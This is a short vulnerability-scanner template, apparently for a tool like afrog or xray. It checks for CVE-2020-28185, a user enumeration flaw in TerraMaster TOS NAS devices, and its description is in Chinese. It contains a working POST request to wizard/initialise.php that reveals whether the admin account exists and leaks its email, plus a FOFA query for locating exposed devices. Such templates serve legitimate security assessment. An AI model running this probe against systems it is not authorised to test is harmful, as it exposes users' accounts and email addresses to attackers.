id: CVE-2020-28185

info:
  name: TerraMaster TOS 用户枚举漏洞
  author: zan8in
  severity: medium
  description: |
    TerraMaster TOS 存在用户枚举漏洞，通过wizard/initialise.php页面的username参数即可枚举系统中的用户，以及泄露邮箱信息
    fofa: "TerraMaster" && header="TOS"
  reference:
    - https://www.tenable.com/security/research/tra-2020-54
    - https://nvd.nist.gov/vuln/detail/CVE-2020-28185
  tags: cve,cve2020,terramaster,enum
  created: 2023/06/23

rules:
  r0:
    request:
      method: POST
      path: /wizard/initialise.php
      body: tab=checkuser&username=admin
    expression: |
      response.status == 200 && response.body.bcontains(b'{"username":"admin","email":"') && response.body.bcontains(b'"status":1')
expression: r0()
